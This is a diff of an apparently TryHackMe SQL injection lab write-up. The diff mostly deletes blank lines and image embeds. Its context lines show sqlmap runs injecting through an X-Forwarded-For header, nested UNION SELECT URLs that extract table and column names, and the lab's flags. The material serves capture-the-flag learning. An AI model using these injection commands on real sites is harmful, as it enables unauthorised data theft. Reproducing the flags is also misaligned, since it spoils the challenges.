@@ -114,7 +114,6 @@ THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
 
 http://10.10.25.154/terms-and-conditions
 
-
 Terms and Conditions
 
 We only have a few small terms:
@@ -238,7 +237,6 @@ available databases [2]:
 
 [*] ending @ 14:33:15 /2023-04-19/
 
-
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ sqlmap -u "http://10.10.234.217/terms-and-conditions" --header="X-Forwarded-For: 1*" --dbms mysql --batch --random-agent --threads=10 Injection marker: * -D sqhell_1 –tables
         ___
@@ -285,7 +283,6 @@ Database: sqhell_1
 [14:38:23] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.234.217'
 
 [*] ending @ 14:38:23 /2023-04-19/
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ sqlmap -u "http://10.10.234.217/terms-and-conditions" --header="X-Forwarded-For: 1*" --dbms mysql --batch --random-agent --threads=10 Injection marker: * -D sqhell_1 -T flag --dump   
@@ -539,7 +536,6 @@ let's test first column
 
 http://10.10.62.233/user?id=31%20union%20select%20%221%20union%20select%201,2,3,4%22,2,3;--%20-
 
-
 User Details
 User ID:  1 union select 1,2,3,4
 Username:  2
@@ -559,7 +555,6 @@ retrieving table_name (seems complicated but it's easy)
 
 http://10.10.62.233/user?id=2%20union%20select%20%221%20union%20select%201,table_name,3,4%20from%20information_schema.tables%20where%20table_schema=database()%22,2,3+from%20information_schema.tables%20where%20table_schema=database();--%20-
 
-
 User ID:  1 union select 1,table_name,3,4 from information_schema.tables where table_schema=database()
 Username:  2
 Posts:
@@ -573,7 +568,6 @@ Posts:
 so we get table_name flag now getting columns
 
 http://10.10.62.233/user?id=2%20union%20select%20%221%20union%20select%201,column_name,3,4%20+FROM+information_schema.columns+WHERE+table_name=%27flag%27%22,2,3+from%20information_schema.tables%20where%20table_schema=database();--%20-
-
 
 User Details
 User ID:  1 union select 1,column_name,3,4 FROM information_schema.columns WHERE table_name='flag'
@@ -640,7 +634,6 @@ THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
 
 Was really fun :)
 
-
 ```
 
 Flag 1  
@@ -650,8 +643,6 @@ Flag 1
 Flag 2  
 
 Make sure to read the terms and conditions ;)
-
-![[Pasted image 20230419134653.png]]
 
 *THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}*
 
@@ -663,22 +654,9 @@ Flag 4
 
 Well, dreams, they feel real while we're in them right?
 
-
-![[Pasted image 20230420121906.png]]
-
-![[Pasted image 20230420124933.png]]
-
-![[Pasted image 20230420125630.png]]
-
 *THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}*
 
 Flag 5
-
-![[Pasted image 20230420130133.png]]
-
-![[Pasted image 20230420131039.png]]
-
-![[Pasted image 20230420131449.png]]
 
 *THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}*
 
